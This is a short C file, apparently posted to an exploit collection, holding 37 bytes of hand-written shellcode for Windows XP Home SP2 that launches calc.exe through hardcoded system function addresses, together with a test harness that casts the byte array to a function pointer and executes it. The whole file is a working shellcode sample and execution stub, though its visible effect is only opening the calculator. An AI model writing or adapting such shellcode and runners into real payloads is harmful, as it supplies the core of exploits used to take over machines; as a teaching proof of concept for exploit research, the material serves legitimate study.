/*
 * Windows Xp Home edition SP2 english ( calc.exe ) 37 bytes shellcode
 * by: Hazem mofeed Aka Hakxer
 * penetration testing labs
 *   www.pentestlabs.com
 */

char evil[] =
"\xeb\x16\x5b\x31\xc0\x50\x53\xbb\x8d\x15\x86\x7c\xff\xd3\x31\xc0"
"\x50\xbb\xea\xcd\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";

int main(int argc, char **argv)
{
int (*shellcode)();
shellcode = (int (*)()) evil;
(int)(*shellcode)();
}